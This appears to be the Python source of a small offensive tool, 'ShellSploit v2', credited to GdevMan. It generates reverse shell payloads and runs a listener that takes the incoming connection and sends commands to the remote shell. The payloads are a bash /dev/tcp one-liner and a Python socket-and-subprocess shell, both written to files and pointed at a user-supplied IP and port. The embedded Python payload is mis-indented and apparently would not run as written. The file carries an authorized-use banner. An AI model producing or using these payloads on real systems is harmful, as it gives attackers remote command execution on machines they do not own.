import os
import getpass
import socket
from colorama import init, Fore, Back, Style
init(autoreset=True)
legal_warning = Fore.RED + """
************************************************************
* WARNING: This tool is intended for authorized testing    *
* only. Use on systems you own or have explicit permission.*
* Unauthorized use is illegal and may result in criminal   *
* and civil penalties.                                     *
************************************************************
"""

def listen(ip, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((ip, port))
        server.listen(1)
        print(f"Listening on {ip}:{port}")
    except OSError as e:
        print(f"[!] Failed to start listener: {e}")
        return

    try:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
    except OSError as e:
        print(f"[!] Accept failed: {e}")
        return

    try:
        while True:
            command = input("Shell> ")
            if command.lower() == "exit":
                break

            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Listener closed.")

def option_check(choice):
    if choice == "1":
        shell_type = input("Enter shell type (bash, python): ").lower()
        ip = input("Enter your IP: ")
        port = int(input("Enter port: "))

        if shell_type == "bash":
            with open("payload.sh", "w") as file:
                file.write(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
            print("[+] Payload Created")
        elif shell_type == "python":
            payload = f"""
            import os,socket,subprocess,threading;
                def s2p(s, p):
                    while True:
                        data = s.recv(1024)
                        if len(data) > 0:
                            p.stdin.write(data)
                            p.stdin.flush()

                def p2s(s, p):
                    while True:
                        s.send(p.stdout.read(1))

                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("{ip}",{port}))

                p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

                s2p_thread = threading.Thread(target=s2p, args=[s, p])
                s2p_thread.daemon = True
                s2p_thread.start()

                p2s_thread = threading.Thread(target=p2s, args=[s, p])
                p2s_thread.daemon = True
                p2s_thread.start()

                try:
                    p.wait()
                except KeyboardInterrupt:
                    s.close()
            """
            with open("payload.py", "w") as file:
                file.write(f"""
                import os,socket,subprocess,threading;
                    def s2p(s, p):
                        while True:
                            data = s.recv(1024)
                            if len(data) > 0:
                                p.stdin.write(data)
                                p.stdin.flush()

                    def p2s(s, p):
                        while True:
                            s.send(p.stdout.read(1))

                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.connect(("{ip}",{port}))

                    p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

                    s2p_thread = threading.Thread(target=s2p, args=[s, p])
                    s2p_thread.daemon = True
                    s2p_thread.start()

                    p2s_thread = threading.Thread(target=p2s, args=[s, p])
                    p2s_thread.daemon = True
                    p2s_thread.start()

                    try:
                        p.wait()
                    except KeyboardInterrupt:
                        s.close()
    """)
        else:
            print("[!] Unknown shell type.")
            return
        
    elif choice == "2":
        port = int(input("Enter port to listen on: "))
        listen("0.0.0.0", port)
    elif choice in ("exit", "quit"):
        exit()
    else:
        print("[!] Invalid option.")

options_menu = Fore.GREEN + """
Options:
1. Reverse Shell Generator
2. Listener
"""
logo = Fore.MAGENTA + r"""
  ██████  ██░ ██ ▓█████  ██▓     ██▓      ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓  
▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░      ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░      ░               ░  ░    ░ ░   ░            

▗▖  ▗▖▄▄▄▄ 
▐▌  ▐▌   █ 
▐▌  ▐▌█▀▀▀ 
 ▝▚▞▘ █▄▄▄ 
"""

username = getpass.getuser()
print(logo)
print("- Made By GdevMan\n- My GH -> https://github.com/GdevMan")
print(legal_warning)
print(options_menu)

def main():
    while True:
        try:
            thing_shell = f"""┌─── {username}\n└ ~ $ """
            choice = input(Fore.GREEN + thing_shell)
            option_check(choice)
        except KeyboardInterrupt:
            print("\n[!] User Quit")
            exit()

if __name__ == "__main__":
    main()


